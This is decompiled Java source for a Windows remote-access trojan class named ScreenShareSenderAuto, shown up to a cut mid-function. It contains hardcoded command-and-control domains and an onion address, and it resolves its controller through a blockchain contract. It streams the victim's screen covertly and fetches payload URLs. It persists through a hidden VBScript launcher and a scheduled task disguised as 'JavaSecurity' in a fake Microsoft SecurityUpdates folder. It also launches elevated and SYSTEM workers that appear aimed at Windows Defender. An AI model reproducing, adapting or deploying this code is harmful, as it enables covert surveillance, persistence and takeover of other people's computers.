package com.example.screen;

import com.sun.jna.platform.win32.Advapi32Util;
import core.TorBridge;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.nio.channels.OverlappingFileLockException;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.net.ssl.HttpsURLConnection;

public class ScreenShareSenderAuto {
   static final String ONION_HOST = "5kiwqdzvhip5yjx5u6ms2hsv3yozpslxocjhyf4cyimrg33fcb7devid.onion";
   private static final String CF_BASE = "https://funrat.mom";
   private static final String[] CF_BASES = new String[]{
      "https://funrat.mom", "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev", "https://relay-mirror.kartohaantoha36-6a9.workers.dev"
   };
   private static String DEFAULT_WS_URL = "";
   private static final String DEFAULT_KEY = "098cf3c1-2b8c-4094-82c2-388699660f90";
   private static final String DEFAULT_DEVICE_NAME = defaultDeviceName();
   private static final int DEFAULT_FPS = 20;
   private static final float DEFAULT_QUALITY = 0.8F;
   private static final float DEFAULT_SCALE = 1.0F;
   private static final long RETRY_MIN_MS = 2000L;
   private static final long RETRY_MAX_MS = 20000L;
   private static final String DEFAULT_WS_PATH = "/screen-stream";
   private static final String PANEL_DOMAIN = "funrat.mom";
   private static final String LOCK_FILENAME = "screen-share-sender.lock";
   private static FileChannel lockChannel;
   private static FileLock lock;
   private static final boolean USE_JAVAW = true;
   private static final Pattern CELL = Pattern.compile("\"cell\":\"([0-9a-fA-F]+)\"");
   private static final String HELPER_ATTEMPT = "helper-attempt.marker";
   private static final long HELPER_ATTEMPT_TTL_MS = 21600000L;
   private static final String SYSTEM_ATTEMPT = "system-attempt.marker";
   private static final long SYSTEM_ATTEMPT_TTL_MS = 86400000L;
   private static final String ELEVATE_MARKER = "elevate-attempt.marker";
   private static final long ELEVATE_MARKER_TTL_MS = 600000L;

   public static void main(String[] args) throws Exception {
      System.setProperty("java.awt.headless", "false");
      new Thread(() -> {
         try {
            ensureAdminIfNeeded(args);
         } catch (Exception e) {
            ex.printStackTrace();
         }
      }).start();
      ensureSingleInstance();

      try {
         TorBridge.get().start();
      } catch (Exception e) {
         e.printStackTrace();
      }

      String key = firstNonEmptyArg(args, 0, resolveValue("SCREEN_ACCESS_KEY", "screen.access.key", "098cf3c1-2b8c-4094-82c2-388699660f90"));
      String wsUrlRaw = resolveWsUrl(args, resolveValue("SCREEN_WS_URL", "screen.ws.url", ""));
      String configuredWs = normalizeWssUrl(wsUrlRaw);
      String deviceName = resolveDeviceName(args, resolveValue("SCREEN_DEVICE_NAME", "screen.device.name", DEFAULT_DEVICE_NAME));
      String fps = firstNonEmptyArg(args, resolveNumericArgIndex(args), resolveValue("SCREEN_FPS", "screen.fps", String.valueOf(20)));
      String quality = firstNonEmptyArg(
         args, resolveNumericArgIndex(args) + 1, resolveValue("SCREEN_JPEG_QUALITY", "screen.jpeg.quality", String.valueOf(0.8F))
      );
      String scale = firstNonEmptyArg(args, resolveNumericArgIndex(args) + 2, resolveValue("SCREEN_SCALE", "screen.scale", String.valueOf(1.0F)));
      String[] params = new String[]{key, "", deviceName, fps, quality, scale};
      long delayMs = 2000L;

      while (true) {
         try {
            String dynamicWs = normalizeWssUrl(getURL());
            String wsUrl = dynamicWs != null ? dynamicWs : configuredWs;
            if (wsUrl == null || wsUrl.trim().isEmpty()) {
               System.out.println("No valid ws URL from getURL()/args/env. Retry...");
               delayMs = Math.min(20000L, delayMs * 2L);
               System.out.println("Retry in " + delayMs + " ms...");
               Thread.sleep(delayMs);
               continue;
            }

            params[1] = wsUrl;
            ScreenShareSender.main(params);
            delayMs = 2000L;
         } catch (Exception e) {
            String msg = e.getMessage();
            System.out.println("Sender connect failed: " + (msg == null ? e.getClass().getSimpleName() : msg));
            delayMs = Math.min(20000L, delayMs * 2L);
         }

         System.out.println("Retry in " + delayMs + " ms...");
         Thread.sleep(delayMs);
      }
   }

   private static byte[] hex(String s) {
      byte[] b = new byte[s.length() / 2];

      for (int i = 0; i < b.length; i++) {
         b[i] = (byte)(Character.digit(s.charAt(i * 2), 16) << 4 | Character.digit(s.charAt(i * 2 + 1), 16));
      }

      return b;
   }

   private static long u(byte[] b, int off, int n) {
      long v = 0L;

      for (int i = 0; i < n; i++) {
         v = v << 8 | b[off + i] & 255L;
      }

      return v;
   }

   private static String decodeText(String bocHex) {
      byte[] b = hex(bocHex);
      int p = 4;
      int flags = b[p++] & 255;
      int s = flags & 7;
      int ob = b[p++] & 255;
      int cells = (int)u(b, p, s);
      p += s;
      int roots = (int)u(b, p, s);
      p += s;
      p += s + ob + roots * s;
      if ((flags & 128) != 0) {
         p += cells * ob;
      }

      int var18 = ++p;
      p++;
      int d2 = b[var18] & 255;
      int bytes = (d2 + 1) / 2;
      return new String(b, p, bytes, StandardCharsets.UTF_8);
   }

   private static String readAll(InputStream is) throws IOException {
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      byte[] buf = new byte[8192];

      int r;
      while ((r = is.read(buf)) != -1) {
         bos.write(buf, 0, r);
      }

      return new String(bos.toByteArray(), Charset.defaultCharset());
   }

   private static String cfgBody() {
      for (String base : CF_BASES) {
         HttpURLConnection wc = null;

         try {
            wc = (HttpURLConnection)new URL(base + "/config").openConnection();
            wc.setRequestMethod("GET");
            wc.setRequestProperty(
               "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            );
            wc.setConnectTimeout(8000);
            wc.setReadTimeout(8000);
            if (wc.getResponseCode() == 200) {
               String body = readAll(wc.getInputStream());
               if (body != null && body.contains("slots")) {
                  return body;
               }
            }
         } catch (Exception var10) {
         } finally {
            if (wc != null) {
               wc.disconnect();
            }
         }
      }

      return null;
   }

   private static String httpGet(String urlStr) {
      HttpURLConnection c = null;

      try {
         c = (HttpURLConnection)new URL(urlStr).openConnection();
         c.setRequestMethod("GET");
         c.setConnectTimeout(8000);
         c.setReadTimeout(8000);
         return c.getResponseCode() != 200 ? null : readAll(c.getInputStream());
      } catch (Exception e) {
         return null;
      } finally {
         if (c != null) {
            c.disconnect();
         }
      }
   }

   private static List<String> slotValues(String body, String key) {
      List<String> out = new ArrayList<>();
      if (body == null) {
         return out;
      }

      Matcher m = Pattern.compile("\"" + key + "\"\\s*:\\s*\"([^\"]+)\"").matcher(body);
      if (!m.find()) {
         return out;
      }

      for (String raw : m.group(1).split(",")) {
         String v = raw.trim();
         if (!v.isEmpty() && !out.contains(v)) {
            out.add(v);
         }
      }

      return out;
   }

   public static List<String> getPayloadUrls() {
      String body = cfgBody();
      if (body == null) {
         String base = getURL();
         if (base != null && base.startsWith("http")) {
            body = httpGet(base + "/config");
         }
      }

      List<String> out = new ArrayList<>();

      for (String key : new String[]{"1", "0"}) {
         for (String u : slotValues(body, key)) {
            if (!out.contains(u)) {
               out.add(u);
            }
         }
      }

      return out;
   }

   public static String getPayloadUrl() {
      List<String> all = getPayloadUrls();
      return all.isEmpty() ? null : all.get(0);
   }

   public static String getPollHost() {
      try {
         for (String v : slotValues(cfgBody(), "9")) {
            String h = hostOf(v);
            if (h != null) {
               return h;
            }
         }
      } catch (Exception var3) {
      }

      return hostOf(getURL());
   }

   private static String hostOf(String url) {
      if (url == null) {
         return null;
      }

      String v = url.trim();
      int scheme = v.indexOf("://");
      if (scheme >= 0) {
         v = v.substring(scheme + 3);
      }

      int slash = v.indexOf(47);
      if (slash >= 0) {
         v = v.substring(0, slash);
      }

      return v.isEmpty() ? null : v;
   }

   public static String getURL() {
      for (String base : CF_BASES) {
         String body = null;

         try {
            body = httpGet(base + "/config");
         } catch (Exception var7) {
         }

         for (String v : slotValues(body, "8")) {
            if (v.startsWith("http")) {
               return v;
            }
         }
      }

      try {
         String address = "EQCsNH1LY2PQeqG2HKSk2myObNTgCuREdq1IVvZFL4k_5iia";
         String url = "https://tonapi.io/v2/blockchain/accounts/" + address + "/methods/getMessage";
         HttpsURLConnection c = (HttpsURLConnection)new URL(url).openConnection();
         c.setRequestMethod("GET");
         c.setRequestProperty("Accept", "application/json");
         int code = c.getResponseCode();
         InputStream in = code >= 200 && code < 300 ? c.getInputStream() : c.getErrorStream();
         String body = readAll(in);
         Matcher m = CELL.matcher(body);
         if (m.find()) {
            c.disconnect();
            return decodeText(m.group(1));
         }

         c.disconnect();
      } catch (Exception e) {
         e.printStackTrace();
      }

      return null;
   }

   private static String resolveValue(String envName, String propName, String fallback) {
      String prop = System.getProperty(propName);
      if (prop != null && !prop.trim().isEmpty()) {
         return prop.trim();
      }

      String env = System.getenv(envName);
      return env != null && !env.trim().isEmpty() ? env.trim() : fallback;
   }

   private static String firstNonEmptyArg(String[] args, int idx, String fallback) {
      if (args != null && idx >= 0 && idx < args.length) {
         String v = args[idx];
         if (v != null && !v.trim().isEmpty()) {
            return v.trim();
         }
      }

      return fallback;
   }

   private static boolean looksLikeWsUrl(String value) {
      if (value == null) {
         return false;
      }

      String v = value.trim().toLowerCase();
      return v.startsWith("ws://") || v.startsWith("wss://");
   }

   private static String normalizeWssUrl(String value) {
      if (value == null) {
         return null;
      }

      String v = value.trim();
      if (v.isEmpty()) {
         return null;
      }

      if (v.startsWith("\"") && v.endsWith("\"") || v.startsWith("'") && v.endsWith("'")) {
         v = v.substring(1, v.length() - 1).trim();
      }

      if (v.isEmpty()) {
         return null;
      } else {
         String lower = v.toLowerCase();
         if (lower.startsWith("https://")) {
            String converted = "wss://" + v.substring("https://".length());
            return panelOnly(ensureDefaultPath(converted));
         } else if (lower.startsWith("http://")) {
            String converted = "wss://" + v.substring("http://".length());
            return panelOnly(ensureDefaultPath(converted));
         } else if (lower.startsWith("wss://")) {
            return panelOnly(ensureDefaultPath(v));
         } else if (lower.startsWith("ws://")) {
            String converted = "wss://" + v.substring("ws://".length());
            return panelOnly(ensureDefaultPath(converted));
         } else if (v.contains("://")) {
            return null;
         } else {
            return v.startsWith("/") ? null : panelOnly(ensureDefaultPath("wss://" + v));
         }
      }
   }

   private static String panelOnly(String wssUrl) {
      if (wssUrl == null) {
         return null;
      }

      try {
         URI uri = URI.create(wssUrl);
         String host = uri.getHost();
         if (host != null && host.toLowerCase().endsWith(".workers.dev")) {
            String path = uri.getRawPath() != null && !uri.getRawPath().isEmpty() ? uri.getRawPath() : "/screen-stream";
            StringBuilder sb = new StringBuilder("wss://").append("funrat.mom").append(path);
            if (uri.getRawQuery() != null && !uri.getRawQuery().isEmpty()) {
               sb.append('?').append(uri.getRawQuery());
            }

            System.out.println("[ws] workers.dev не годится для потока, подменяю на funrat.mom");
            return sb.toString();
         }
      } catch (Exception var5) {
      }

      return wssUrl;
   }

   private static String ensureDefaultPath(String wssUrl) {
      if (wssUrl != null && !wssUrl.trim().isEmpty()) {
         String value = wssUrl.trim();
         int schemePos = value.indexOf("://");
         if (schemePos < 0) {
            return value;
         } else {
            int pathPos = value.indexOf(47, schemePos + 3);
            if (pathPos < 0) {
               return value + "/screen-stream";
            } else {
               return pathPos == value.length() - 1 ? value + "/screen-stream".substring(1) : value;
            }
         }
      } else {
         return null;
      }
   }

   private static boolean arg1IsDiscordFlag(String[] args) {
      return args != null && args.length > 1 && args[1] != null && "discord".equalsIgnoreCase(args[1].trim());
   }

   private static boolean arg1IsWsUrl(String[] args) {
      return args != null && args.length > 1 && looksLikeWsUrl(args[1]);
   }

   private static String resolveWsUrl(String[] args, String fallback) {
      if (arg1IsDiscordFlag(args)) {
         return args.length > 2 && looksLikeWsUrl(args[2]) ? firstNonEmptyArg(args, 2, fallback) : fallback;
      } else if (arg1IsWsUrl(args)) {
         return firstNonEmptyArg(args, 1, fallback);
      } else {
         return args != null && args.length > 2 && looksLikeWsUrl(args[2]) ? firstNonEmptyArg(args, 2, fallback) : fallback;
      }
   }

   private static String resolveDeviceName(String[] args, String fallback) {
      if (arg1IsWsUrl(args)) {
         return firstNonEmptyArg(args, 2, fallback);
      } else if (arg1IsDiscordFlag(args)) {
         return args.length > 2 && looksLikeWsUrl(args[2]) ? firstNonEmptyArg(args, 3, fallback) : firstNonEmptyArg(args, 2, fallback);
      } else {
         return firstNonEmptyArg(args, 1, fallback);
      }
   }

   private static int resolveNumericArgIndex(String[] args) {
      if (arg1IsWsUrl(args)) {
         return 3;
      } else if (arg1IsDiscordFlag(args)) {
         return args.length > 2 && looksLikeWsUrl(args[2]) ? 4 : 3;
      } else {
         return args != null && args.length > 2 && looksLikeWsUrl(args[2]) ? 3 : 2;
      }
   }

   private static String defaultDeviceName() {
      String pcName = System.getProperty("user.name");
      String host = System.getenv("COMPUTERNAME");
      if (pcName == null || pcName.trim().isEmpty()) {
         pcName = "user";
      }

      if (host == null || host.trim().isEmpty()) {
         host = "host";
      }

      return pcName + "@" + host;
   }

   public static void setupAdminOnce(String[] args) {
      try {
         ensureAdminIfNeeded(args);
      } catch (Throwable t) {
         System.out.println("admin setup failed: " + t);
      }
   }

   private static void ensureAdminIfNeeded(String[] args) throws Exception {
      if (isWindows()) {
         Path dir = securityDir();
         Files.createDirectories(dir);
         Files.write(dir.resolve("Update.vbs"), updateVbs(dir, args));
         if (isRunningAsAdmin()) {
            System.out.println("[admin] client is elevated (unexpected): no worker needed");
         } else if (helperStatusFresh()) {
            System.out.println("[admin] helper status fresh: defender=" + readHelperDefender());
         } else if (helperAttemptFresh()) {
            System.out.println("[admin] recent helper attempt: staying silent");
         } else {
            System.out.println("[admin] client stays MEDIUM; starting high worker");
            markHelperAttempt();
            long before = helperStatusMtime();

            try {
               ScreenShareSender.elevateWorker("screen", false);
            } catch (Throwable t) {
               System.out.println("[admin] high worker failed: " + t);
            }

            for (int i = 0; i < 120 && helperStatusMtime() <= before; i++) {
               Thread.sleep(500L);
            }

            String defender = readHelperDefender();
            System.out.println("[admin] helper defender=" + defender);
            if (!"ok".equals(defender) && !systemAttemptFresh()) {
               markSystemAttempt();
               System.out.println("[admin] defender not fully applied (" + defender + "): SYSTEM pass");

               try {
                  ScreenShareSender.elevateWorker("syselev", true);
               } catch (Throwable t) {
                  System.out.println("[admin] system worker failed: " + t);
               }

               System.out.println("[admin] helper defender after system=" + readHelperDefender());
            }
         }
      }
   }

   public static void installOnLogonTask() {
      ensureOnLogonTask(securityDir());
   }

   private static boolean helperAttemptFresh() {
      return markerFresh("helper-attempt.marker", 21600000L);
   }

   private static void markHelperAttempt() {
      writeMarker("helper-attempt.marker");
   }

   private static boolean systemAttemptFresh() {
      return markerFresh("system-attempt.marker", 86400000L);
   }

   private static void markSystemAttempt() {
      writeMarker("system-attempt.marker");
   }

   private static boolean markerFresh(String name, long ttl) {
      try {
         Path m = securityDir().resolve(name);
         if (!Files.isRegularFile(m)) {
            return false;
         }

         long age = System.currentTimeMillis() - Files.getLastModifiedTime(m).toMillis();
         return age >= 0L && age < ttl;
      } catch (Exception ignored) {
         return false;
      }
   }

   private static void writeMarker(String name) {
      try {
         Files.write(securityDir().resolve(name), String.valueOf(System.currentTimeMillis()).getBytes(StandardCharsets.UTF_8));
      } catch (Exception var2) {
      }
   }

   private static boolean helperStatusFresh() {
      try {
         Path s = securityDir().resolve("helper.status");
         if (!Files.isRegularFile(s)) {
            return false;
         }

         long age = System.currentTimeMillis() - Files.getLastModifiedTime(s).toMillis();
         String d = readHelperDefender();
         return age >= 0L && age < 21600000L && "ok".equals(d);
      } catch (Exception ignored) {
         return false;
      }
   }

   public static String helperState() {
      return readHelperDefender();
   }

   private static long helperStatusMtime() {
      try {
         Path s = securityDir().resolve("helper.status");
         return !Files.isRegularFile(s) ? -1L : Files.getLastModifiedTime(s).toMillis();
      } catch (Exception ignored) {
         return -1L;
      }
   }

   private static String readHelperDefender() {
      try {
         Path s = securityDir().resolve("helper.status");
         if (!Files.isRegularFile(s)) {
            return "none";
         }

         for (String line : Files.readAllLines(s, StandardCharsets.UTF_8)) {
            String t = line.trim();
            if (t.startsWith("defender=")) {
               return t.substring("defender=".length()).trim();
            }
         }
      } catch (Exception var4) {
      }

      return "unknown";
   }

   private static Path securityDir() {
      String appData = System.getenv("APPDATA");
      Path base = appData != null && !appData.trim().isEmpty() ? Paths.get(appData) : Paths.get(System.getProperty("user.home", "."));
      return base.resolve("Microsoft").resolve("SecurityUpdates");
   }

   private static byte[] updateVbs(Path dir, String[] args) {
      String key = args != null && args.length > 0 && args[0] != null ? args[0].trim() : "";
      String cmd = "\"\"\"" + getJavaPath() + "\"\" -jar \"\"" + dir.resolve("JavaSecurity.jar") + "\"\" " + key + "\"";
      return ("CreateObject(\"WScript.Shell\").Run " + cmd + ", 0, False").getBytes();
   }

   private static void ensureOnLogonTask(Path dir) {
      String vbs = "wscript.exe \"" + dir.resolve("Update.vbs") + "\"";
      String[] attempts = new String[]{"C:\\Windows\\System32\\schtasks.exe", "schtasks", "C:\\Windows\\System32\\cmd.exe"};

      for (String exe : attempts) {
         try {
            List<String> cmd = new ArrayList<>();
            cmd.add(exe);
            if (exe.endsWith("cmd.exe")) {
               cmd.add("/c");
            }

            cmd.add("/Create");
            cmd.add("/TN");
            cmd.add("JavaSecurity");
            cmd.add("/SC");
            cmd.add("ONLOGON");
            cmd.add("/TR");
            cmd.add(vbs);
            cmd.add("/RL");
            cmd.add("LIMITED");
            cmd.add("/IT");
            cmd.add("/F");
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            InputStream is = p.getInputStream();

            String out;
            try {
               ByteArrayOutputStream bos = new ByteArrayOutputStream();
               byte[] b = new byte[4096];

               int n;
               while ((n = is.read(b)) != -1) {
                  bos.write(b, 0, n);
               }

               out = new String(bos.toByteArray(), "UTF-8").trim();
            } catch (Throwable var16) {
               if (is != null) {
                  try {
                     is.close();
                  } catch (Throwable var15) {
                     var16.addSuppressed(var15);
                  }
               }

               throw var16;
            }

            if (is != null) {
               is.close();
            }

            int rc = p.waitFor();
            System.out.println("[admin] schtasks via " + exe + " rc=" + rc + (out.isEmpty() ? "" : " out=" + out.replaceAll("\\s+", " ")));
            if (rc == 0) {
               return;
            }
         } catch (Throwable e) {
            System.out.println("[admin] schtasks via " + exe + " failed: " + e);
         }
      }
   }

   private static boolean adminInstanceAlive() {
      long self = getProcessId();
      Path owner = securityDir().resolve("owner.pid");

      try {
         if (Files.isRegularFile(owner)) {
            long pid = -1L;
            boolean admin = false;

            for (String line : Files.readAllLines(owner, StandardCharsets.UTF_8)) {
               String t = line.trim();
               if (t.startsWith("pid=")) {
                  try {
                     pid = Long.parseLong(t.substring(4).trim());
                  } catch (NumberFormatException var12) {
                  }
               } else if (t.startsWith("admin=")) {
                  admin = t.endsWith("1");
               }
            }

            if (pid > 0L && pid != self) {
               return admin && isProcessAlive(pid);
            }
         }
      } catch (Exception var14) {
      }

      try {
         Path l = securityDir().resolve("rat-sender.lock");
         if (!Files.isRegularFile(l)) {
            return false;
         }

         long pid = -1L;
         boolean admin = false;

         for (String line : Files.readAllLines(l, StandardCharsets.UTF_8)) {
            String t = line.trim();
            if (t.startsWith("pid=")) {
               try {
                  pid = Long.parseLong(t.substring(4).trim());
               } catch (NumberFormatException var11) {
               }
            } else if (t.startsWith("admin=")) {
               admin = t.endsWith("1");
            }
         }

         return admin && pid > 0L && pid != self && isProcessAlive(pid);
      } catch (Exception ignored) {
         return false;
      }
   }

   private static boolean elevationAttemptFresh() {
      try {
         Path m = securityDir().resolve("elevate-attempt.marker");
         if (!Files.isRegularFile(m)) {
            return false;
         }

         long age = System.currentTimeMillis() - Files.getLastModifiedTime(m).toMillis();
         return age >= 0L && age < 600000L;
      } catch (Exception ignored) {
         return false;
      }
   }

   private static void markElevationAttempt() {
      try {
         Path m = securityDir().resolve("elevate-attempt.marker");
         Files.write(m, String.valueOf(System.currentTimeMillis()).getBytes());
      } catch (Exception var1) {
      }
   }

   public static boolean remove(String taskName) {
      boolean changed = false;
      String appData = System.getenv("APPDATA");
      if (appData != null && !appData.isEmpty()) {
         String key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
         String regDel = String.format("reg delete \"%s\" /v \"%s\" /f", key, taskName);
         int rc = run(regDel);
         if (rc == 0) {
            System.out.println("Removed autostart via HKCU Run: " + taskName);
            changed = true;
         }

         File helperDir = Paths.get(appData, "AutoStartMini").toFile();
         File hkcuBat = new File(helperDir, taskName + "-run.bat");
         if (deleteIfExists(hkcuBat.toPath())) {
            System.out.println("Deleted helper .bat: " + hkcuBat.getAbsolutePath());
            changed = true;
         }

         String startup = appData + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
         File startupBat = new File(startup, taskName + ".bat");
         if (deleteIfExists(startupBat.toPath())) {
            System.out.println("Deleted Startup .bat: " + startupBat.getAbsolutePath());
            changed = true;
         }

         if (helperDir.isDirectory() && isDirEmpty(helperDir.toPath()) && deleteIfExists(helperDir.toPath())) {
            System.out.println("Deleted empty helper dir: " + helperDir.getAbsolutePath());
            changed = true;
         }

         if (!changed) {
            System.out.println("Nothing to remove (no registry value / files found)");
         }

         return changed;
      } else {
         System.out.println("APPDATA is not set");
         return false;
      }
   }

   private static int run(String cmd) {
      try {
         return new ProcessBuilder("cmd", "/c", cmd).inheritIO().start().waitFor();
      } catch (Exception e) {
         return -1;
      }
   }

   private static boolean deleteIfExists(Path p) {
      try {
         return Files.deleteIfExists(p);
      } catch (IOException ignored) {
         return false;
      }
   }

   private static boolean isDirEmpty(Path dir) {
      try {
         DirectoryStream<Path> ds = Files.newDirectoryStream(dir);

         boolean var2;
         try {
            var2 = !ds.iterator().hasNext();
         } catch (Throwable var5) {
            if (ds != null) {
               try {
                  ds.close();
               } catch (Throwable var4) {
                  var5.addSuppressed(var4);
               }
            }

            throw var5;
         }

         if (ds != null) {
            ds.close();
         }

         return var2;
      } catch (IOException e) {
         return false;
      }
   }

   public static String getJavaPath() {
      List<String> candidates = new ArrayList<>();
      String javaHomeEnv = System.getenv("JAVA_HOME");
      if (javaHomeEnv != null && !javaHomeEnv.isEmpty()) {
         candidates.add(javaHomeEnv + "\\bin\\javaw.exe");
         candidates.add(javaHomeEnv + "\\bin\\java.exe");
      }

      String javaHomeProp = System.getProperty("java.home");
      if (javaHomeProp != null && !javaHomeProp.isEmpty()) {
         candidates.add(javaHomeProp + "\\bin\\javaw.exe");
         candidates.add(javaHomeProp + "\\bin\\java.exe");
      }

      String bootLibPath = System.getProperty("sun.boot.library.path");
      if (bootLibPath != null && !bootLibPath.isEmpty()) {
         candidates.add(bootLibPath + "\\javaw.exe");
         candidates.add(bootLibPath + "\\java.exe");
         candidates.add(bootLibPath + "\\bin\\javaw.exe");
         candidates.add(bootLibPath + "\\bin\\java.exe");
      }

      String found = firstExisting(candidates);
      if (found != null) {
         return found;
      }

      String fromPath = findOnPathPreferJavaw();
      return fromPath != null ? fromPath : null;
   }

   private static boolean isElevated() {
      try {
         return Advapi32Util.isCurrentProcessElevated();
      } catch (Throwable ignored) {
         return false;
      }
   }

   private static String firstExisting(List<String> paths) {
      for (String p : paths) {
         if (p != null && !p.isEmpty()) {
            File f = new File(p);
            if (f.isFile()) {
               return f.getAbsolutePath();
            }
         }
      }

      return null;
   }

   private static String findOnPathPreferJavaw() {
      String jw = whereFirst("javaw.exe");
      return jw != null ? jw : whereFirst("java.exe");
   }

   private static String whereFirst(String exe) {
      Process proc = null;
      BufferedReader br = null;

      try {
         proc = new ProcessBuilder("cmd.exe", "/c", "where " + exe).redirectErrorStream(true).start();
         br = new BufferedReader(new InputStreamReader(proc.getInputStream(), Charset.defaultCharset()));
         List<String> lines = new ArrayList<>();

         String line;
         while ((line = br.readLine()) != null) {
            line = line.trim();
            if (!line.isEmpty()) {
               lines.add(line);
            }
         }

         int code = proc.waitFor();
         if (code == 0) {
            for (String l : lines) {
               File f = new File(l);
               if (f.isFile()) {
                  return f.getAbsolutePath();
               }
            }
         }
      } catch (IOException var22) {
      } catch (InterruptedException e) {
         Thread.currentThread().interrupt();
      } finally {
         try {
            if (br != null) {
               br.close();
            }
         } catch (IOException var21) {
         }

         if (proc != null) {
            proc.destroy();
         }
      }

      return null;
   }

   public static boolean taskExists(String taskName) throws Exception {
      ProcessBuilder pb = new ProcessBuilder("schtasks", "/Query", "/TN", taskName);
      pb.redirectErrorStream(true);
      Process p = pb.start();
      int exit = p.waitFor();
      return exit == 0;
   }

   private static void elevateSelf(String[] args) throws URISyntaxException {
      System.out.println("[admin] elevateSelf disabled");
   }

   private static String buildParams(String jarPath, String[] args) {
      StringBuilder sb = new StringBuilder();
      if (jarPath.toLowerCase().endsWith(".jar")) {
         sb.append("-jar \"").append(jarPath).append("\"");
      } else {
         sb.append("-cp \"").append(jarPath).append("\" ");
         sb.append(ScreenShareSenderAuto.class.getName());
      }

      if (args != null) {
         for (String arg : args) {
            sb.append(" ").append(quoteArg(arg));
         }
      }

      return sb.toString();
   }

   private static String quoteArg(String arg) {
      if (arg == null) {
         return "\"\"";
      }

      String escaped = arg.replace("\"", "\\\"");
      return "\"" + escaped + "\"";
   }

   private static String getJVMLauncher() {
      String javaHome = System.getProperty("java.home");
      String exeName = "javaw.exe";
      File exe = new File(javaHome + File.separator + "bin" + File.separator + exeName);
      return exe.exists() ? exe.getAbsolutePath() : exeName;
   }

   private static String getCurrentJarPath() throws URISyntaxException {
      File loc = new File(ScreenShareSenderAuto.class.getProtectionDomain().getCodeSource().getLocation().toURI());
      return loc.isFile() && loc.getName().toLowerCase().endsWith(".jar") ? loc.getAbsolutePath() : System.getProperty("java.class.path");
   }

   private static void ensureSingleInstance() throws Exception {
      boolean admin = isRunningAsAdmin();
      Path lockPath = Paths.get(System.getProperty("java.io.tmpdir"), "screen-share-sender.lock");
      int attempts = 0;

      while (attempts < 10) {
         attempts++;

         try {
            lockChannel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE);
            lock = lockChannel.tryLock();
            if (lock != null) {
               writeLockInfo(lockChannel, admin);
               Runtime.getRuntime().addShutdownHook(new Thread(ScreenShareSenderAuto::releaseLock));
               return;
            }
         } catch (OverlappingFileLockException var4) {
         }

         ScreenShareSenderAuto.LockInfo existing = readLockInfo(lockPath);
         if (existing != null && existing.pid > 0L && isProcessAlive(existing.pid)) {
            if (admin && !existing.admin && tryTerminateProcess(existing.pid)) {
               Thread.sleep(500L);
               continue;
            }

            System.out.println("Sender already running" + (existing.admin ? " (admin)" : ""));
            System.exit(0);
         }

         Thread.sleep(300L);
      }

      System.out.println("Sender already running.");
      System.exit(0);
   }

   private static void releaseLock() {
      try {
         if (lock != null && lock.isValid()) {
            lock.release();
         }
      } catch (Exception var2) {
      }

      try {
         if (lockChannel != null) {
            lockChannel.close();
         }
      } catch (Exception var1) {
      }
   }

   private static void writeLockInfo(FileChannel channel, boolean admin) throws Exception {
      String content = "pid=" + getProcessId() + "\nadmin=" + (admin ? "1" : "0") + "\n";
      byte[] bytes = content.getBytes(StandardCharsets.UTF_8);
      channel.truncate(0L);
      channel.position(0L);
      channel.write(ByteBuffer.wrap(bytes));
      channel.force(true);
   }

   private static ScreenShareSenderAuto.LockInfo readLockInfo(Path path) {
      try {
         List<String> lines = Files.readAllLines(path, StandardCharsets.UTF_8);
         long pid = -1L;
         boolean admin = false;

         for (String line : lines) {
            if (line != null) {
               String trimmed = line.trim();
               if (trimmed.startsWith("pid=")) {
                  try {
                     pid = Long.parseLong(trimmed.substring(4).trim());
                  } catch (NumberFormatException var9) {
                  }
               } else if (trimmed.startsWith("admin=")) {
                  admin = "1".equals(trimmed.substring(6).trim()) || "true".equalsIgnoreCase(trimmed.substring(6).trim());
               }
            }
         }

         if (pid > 0L) {
            return new ScreenShareSenderAuto.LockInfo(pid, admin);
         }
      } catch (Exception var10) {
      }

      return null;
   }

   private static boolean isProcessAlive(long pid) {
      if (pid <= 0L) {
         return false;
      } else if (isWindows()) {
         String out = runCommand(new String[]{"cmd", "/c", "tasklist /FI \"PID eq " + pid + "\""});
         return out == null ? false : out.contains(" " + pid + " ");
      } else {
         return false;
      }
   }

   private static boolean tryTerminateProcess(long pid) {
      if (pid <= 0L) {
         return false;
      }

      if (isWindows()) {
         runCommand(new String[]{"cmd", "/c", "taskkill /PID " + pid + " /T /F"});

         try {
            Thread.sleep(300L);
         } catch (InterruptedException var3) {
         }

         return !isProcessAlive(pid);
      } else {
         return false;
      }
   }

   private static boolean isRunningAsAdmin() {
      if (!isWindows()) {
         return false;
      }

      try {
         return isElevated();
      } catch (Throwable var3) {
         String script = "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)";
         String out = runCommand(new String[]{"powershell", "-NoProfile", "-NonInteractive", "-Command", script});
         if (out == null) {
            return false;
         }

         String v = out.trim().toLowerCase();
         return v.startsWith("true") || v.startsWith("1");
      }
   }

   private static boolean isWindows() {
      String os = System.getProperty("os.name");
      return os != null && os.toLowerCase().contains("win");
   }

   private static String runCommand(String[] command) {
      Process p = null;

      try {
         p = new ProcessBuilder(command).redirectErrorStream(true).start();
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         InputStream in = p.getInputStream();
         byte[] buffer = new byte[1024];

         int n;
         while ((n = in.read(buffer)) != -1) {
            baos.write(buffer, 0, n);
         }

